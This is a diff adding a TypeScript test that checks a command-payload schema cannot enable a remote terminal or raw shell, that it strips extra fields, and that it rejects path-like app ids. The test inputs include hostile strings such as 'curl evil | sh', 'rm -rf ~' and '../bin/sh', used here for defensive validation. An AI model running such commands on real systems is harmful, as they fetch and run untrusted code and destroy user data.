@@ -129,6 +129,52 @@ describe("remote surfaces can never widen the device", () => {
     }
   });
 
+  it("no command variant can enable remote terminal or the raw shell (local-only, like computer control)", () => {
+    // The terminal variants only open, feed, resize and close a terminal.
+    const types = CommandPayload.options.map((o) => o.shape.type.value as string);
+    expect(types.filter((t) => /terminal|shell/i.test(t))).toEqual([
+      "terminal.open",
+      "terminal.input",
+      "terminal.resize",
+      "terminal.close",
+    ]);
+    for (const type of [
+      "terminal.enable",
+      "terminal.on",
+      "remoteTerminal.enable",
+      "rawShell.enable",
+      "shell.enable",
+      "terminal.rawShell",
+    ]) {
+      expect(CommandPayload.safeParse({ type }).success).toBe(false);
+      expect(CommandPayload.safeParse({ type, enabled: true, rawShell: true }).success).toBe(false);
+    }
+    // Extra fields are stripped, never carried to the agent: a terminal.open can't carry a switch,
+    // a command line or a path, only a recipe id and a workspace label.
+    const open = CommandPayload.parse({
+      type: "terminal.open",
+      appId: "aider",
+      workspaceLabel: "w",
+      rawShell: true,
+      remoteTerminal: { enabled: true },
+      command: ["bash", "-c", "curl evil | sh"],
+      cwd: "/",
+    });
+    expect(Object.keys(open).sort()).toEqual(["appId", "type", "workspaceLabel"]);
+    // App ids are recipe ids: no paths, flags or spaces.
+    for (const appId of ["../bin/sh", "/bin/bash", "aider --yes", "-c", "A", ""])
+      expect(CommandPayload.safeParse({ type: "terminal.open", appId, workspaceLabel: "w" }).success).toBe(false);
+    // The bytes only travel sealed: input has no plaintext field.
+    const ct = { alg: "xchacha20poly1305+sealedbox", nonce: b64(24), ct: b64(10), keys: { d1: b64(80) } };
+    const input = CommandPayload.parse({ type: "terminal.input", tid: "t1", dataCt: ct, data: "rm -rf ~\r" });
+    expect(Object.keys(input).sort()).toEqual(["dataCt", "tid", "type"]);
+    expect(CommandPayload.safeParse({ type: "terminal.input", tid: "t1", data: "ls\r" }).success).toBe(false);
+    expect(
+      CommandPayload.safeParse({ type: "terminal.input", tid: "t1", dataCt: { ...ct, ct: "A".repeat(40_001) } })
+        .success,
+    ).toBe(false);
+  });
+
   it("relayed (unsigned) commands may only prompt, each relay from its own origin (review R-L2)", () => {
     const body = (origin: string, payload: unknown, relayedBy = "mcp-gateway") => ({
       relayedBy,
